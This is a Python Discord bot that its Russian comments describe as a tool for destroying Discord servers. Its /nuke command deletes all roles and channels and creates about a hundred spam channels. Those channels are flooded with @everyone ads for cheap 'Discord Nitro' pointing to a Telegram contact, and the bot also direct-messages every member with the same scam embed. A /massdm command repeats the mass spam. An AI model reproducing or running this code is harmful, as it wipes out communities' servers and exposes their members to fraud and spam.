# Этот код я написал исключительно для себя, это сделано для уничтожения discord серверов
# Моя первая работа, не судите строго
# Импорт необходимых библиотек (Могут не все использоваться, их я копипастнул с других кодов)

from discord import Intents
from discord.ext import commands
from requests import put
import discord
from asyncio import create_task
from discord.ext import commands
from random import randint, choice


prefix = 'jgfdugi' # наш префикс, он не используется, это просто необходимая переменная

token = 'тут токен бота' # переменная с тоном бота



intents = discord.Intents.all() # включаем все необходимые интенты в боте
intents.members = True
client = commands.Bot(command_prefix=prefix,
                      help_command=None,
                      intents=intents)

# ниже мы создаем асинхронные функции, которые будет выполнять бот используя команду /nuke

async def killchannel(ctx,ch):
    try:
        await ch.delete()
    except:
        pass

async def sendch(ctx,ch,text,count):
 for _ in range(count):
    try:
        await ch.send(text)
    except:
        pass


async def killrole(ctx,role):
    try:
        await role.delete()
    except:
        pass

async def createchannel(ctx):
    try:
        c = await ctx.guild.create_text_channel('Discord Nitro', topic = 'сервер был продан')
    except:
        pass
    else:
        create_task(sendch(ctx,ch=c,text='@everyone @here Покупка дешевых **Nitro** - https://t.me/userphonk', count=200))
        

# Выполнение основной команды

@client.slash_command(description="Основная команда краша.")
async def nuke(ctx):
    for rolee in ctx.guild.roles:
        create_task(killrole(ctx,role=rolee))
    for channel in ctx.guild.text_channels:
        create_task(sendch(ctx,ch=channel,text='@everyone @here Покупка дешевых **Nitro** - https://t.me/userphonk',count=1))
    for channel in ctx.guild.channels:
        create_task(killchannel(ctx,ch=channel))
    for _ in range(100):
        create_task(createchannel(ctx))

        emoo = discord.Embed(
            title='Привет',
            description='Давно хотел преобрести подписку **Discord Nitro** по очень низкой стоимости? Если да, то ты можешь это сделав написав мне в [личные сообщения](https://t.me/userphonk).',
            color = 0x2f3136
        )
        emoo.set_image(url = 'https://media.discordapp.net/attachments/797529491940704320/1066024146796019772/image.png?width=771&height=343')
    for member in ctx.guild.members:
        try:
            await member.send(f'{member.mention}', embed=emoo)
        except:
            pass 

# Это команда массовой рассылки сообщений по всем пользователям сервера

@client.slash_command(description="...")
async def massdm(ctx):
    emoo = discord.Embed(
            title='Привет',
            description='Давно хотел преобрести подписку **Discord Nitro** по очень низкой стоимости? Если да, то ты можешь это сделав написав мне в [личные сообщения](https://t.me/userphonk).',
            color = 0x2f3136
        )
    emoo.set_image(url = 'https://media.discordapp.net/attachments/797529491940704320/1066024146796019772/image.png?width=771&height=343')
    for member in ctx.guild.members:
        try:
            await member.send(f'{member.mention}', embed=emoo)
        except:
            pass 
        print(f"bot is dm to: ", member.name)
        
client.run(token)